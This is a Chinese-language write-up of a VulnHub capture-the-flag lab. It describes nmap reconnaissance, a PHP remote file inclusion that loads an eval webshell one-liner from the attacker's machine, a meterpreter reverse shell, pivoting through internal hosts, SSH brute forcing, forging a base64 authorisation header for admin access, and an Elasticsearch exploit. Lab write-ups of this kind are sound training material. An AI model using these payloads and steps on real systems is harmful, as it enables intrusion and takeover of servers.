题目来源：vulnhub

靶机做完耗时3天左右（大概18小时）

首先感慨一下，自己在CTF方面的积累太少太少了，水平太差太差了。。。  
个人将CTF分为4种模式：解题模式、靶场模式、综合模式、攻防模式  
解题模式：考察知识点=flag，比如答对一个知识点，弹框给出flag，个人觉得此种模式以一种很难想到的方式考察知识点，让人有些无语，感觉也比较鸡肋  
靶场模式：通常拿到webshell=flag  
综合模式：靶场模式+内网渗透=flag  
攻防模式：综合模式+防守=flag

由于攻击过程中没有截图，且答完之后ip会被拉入黑名单，故此处只是文字描述

flag1/6:  
靶机和攻击机kali都选择NAT模式，kali下执行：  
nmap -sn -T4 172.16.35.0/24  
-sn：执行ping扫描，同时关闭端口扫描  
-T4：-T选项一共0-5六个级别，分别是-T0、-T1、-T2、-T3、-T4、-T5，默认是-T3，-T0和-T1发包速率最慢，通常用于躲避IDS、IPS，-T2发包速率相对较慢，适合网络较差环境，-T4和-T5发包速率相对较快，适合网络较好环境  
扫描到靶机ip后，执行  
nmap -v -A -p1-65535 172.16.35.139  
-v：将nmap的执行过程输出  
-A：它是一个综合选项，包括操作系统检测、服务及版本检测、脚本扫描、路由跟踪  
-p：指定要扫描的端口号，也可单个指定，-p80,443,8080,8000  
发现目标开放了端口22、8000  
访问端口8000，输入flag{start}，来开启第一个攻击环境

flag2/6:  
看到形如http://172.16.35.139/?file=blog1 的url，同时通过Wappalyzer得知目标技术架构：php+linux，想到php中的文件包含漏洞  
先尝试本地文件包含漏洞http://172.16.35.139/?file=/etc/passwd 成功读取到/etc/passwd  
执行“systemctl start apache2”启动apache httpd服务，apache的web目录位于/var/www/html/  
再尝试远程文件包含漏洞http://172.16.35.139/?file=htt://172.16.35.128/phpinfo.txt 成功执行phpinfo，phpinfo.txt中的内容为
```
<?php phpinfo(); ?>
```
最后尝试http://172.16.35.139/?file=htt://172.16.35.128/ant.txt ant.txt中的内容为，
```
<?php @eval($_POST['pass']); ?>
```
蚁剑连接，成功拿到webshell，flag位于根目录下

flag3/6:  
拿到webshell后，本地生成msf payload，通过蚁剑上传并执行，本地收到反连meterpreter  
在meterpreter中添加路由，启动msf中的socks5代理，通过proxychains进行nmap扫描，当通过proxychains进行firefox访问时，不能访问到业务  
改用端口映射的方式，使用msf中自带的端口扫描auxiliary/scanner/portscan/tcp进行端口扫描，然后添加端口映射，firefox访问本地的地址，成功访问到业务  
burp代理，破解弱口令为password，并进行文件上传，蚁剑连接一直不能成功，改用菜刀，成功拿到webshell，flag位于根目录下

flag4/6:  
根据提示给出的hash，破解出10个密码，使用msf中自带的模块auxiliary/scanner/ssh/ssh_login进行爆破，其中有一个密码正确，msf会直接给反弹一个bash shell，flag位于根目录下  
此步骤中，很多文章给出的方式都是使用MobaXterm自带的代理功能配置代理，然后ssh登录，但我发现使用msf中的ssh_login更方便

flag5/6:  
根据提示扫描内网的80,443,8080,8000，使用auxiliary/scanner/portscan/tcp扫描后发现一台主机开放8000端口，使用端口映射的方式创建隧道，访问本地端口  
看到修改密码功能想到垂直越权漏洞，抓包后分析，发现将authority: YnV5ZXIxMzphcm1zMTM=这一行删除后再改密码无效，base64解密后发现这是user:password的形式，将user改为admin后重新base64编码，成功更改密码，flag位于聊天中

flag6/6:  
根据提示，是个elasticsearch相关的漏洞，使用auxiliary/scanner/portscan/tcp扫描后发现一台开放9200和9300的elasticsearch服务器，版本是1.4.2，通过searchsploit搜索elasticsearch的漏洞，搜到后使用searchsploit -m linux/remote/36337.py拷贝镜像到当前目录，直接执行会报错，查看poc发现将端口写死了，由于我是通过端口转发的方式，需要修改端口，修改端口后，成功拿到shell，flag位于根目录中

参考链接：  
https://shallowdream.cn/posts/50496#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F  
https://blog.csdn.net/weixin_43784056/article/details/105877401
